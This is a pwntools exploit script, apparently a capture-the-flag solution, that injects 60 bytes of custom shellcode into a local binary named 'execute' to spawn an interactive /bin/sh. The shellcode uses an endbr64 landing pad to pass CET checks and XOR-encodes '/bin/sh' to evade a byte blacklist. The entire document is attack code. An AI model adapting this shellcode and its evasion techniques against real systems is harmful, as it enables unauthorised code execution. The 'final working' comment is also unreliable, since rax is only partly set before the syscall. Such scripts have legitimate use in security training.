from pwn import *

elf = context.binary = ELF('./execute')
context.log_level = 'debug'

# Final working shellcode with CET bypass and blacklist avoidance
shellcode = (
    # CET/IBT landing pad (required for IBT protection)
    b'\xf3\x0f\x1e\xfa'      # endbr64
    
    # Main shellcode
    b'\x48\xb8\xd0\x9d\x96\x91\xd0\x8c\x97\xff'  # mov rax, 0xff978cd091969dd0 (encoded /bin/sh)
    b'\x50'                   # push rax
    b'\x48\x89\xe7'           # mov rdi, rsp
    b'\x6a\x00'               # push 0
    b'\x59'                   # pop rcx (rcx=0)
    b'\x80\x34\x0f\xff'       # xor byte [rdi+rcx], 0xff
    b'\xfe\xc1'               # inc cl
    b'\x90'                   # nop (padding for jump offset)
    b'\x80\xf9\x08'           # cmp cl, 8
    b'\x75\xf4'               # jne -12
    b'\x6a\x00'               # push 0
    b'\x5e'                   # pop rsi (rsi=0)
    b'\x6a\x00'               # push 0
    b'\x5a'                   # pop rdx (rdx=0)
    b'\xb0\x3c'               # mov al, 60
    b'\xfe\xc8'               # dec al (al=59, execve)
    b'\x0f\x05'               # syscall
)

# Pad to exactly 60 bytes with NOPs
shellcode = shellcode.ljust(60, b'\x90')

io = process(elf.path)
io.send(shellcode)
io.interactive()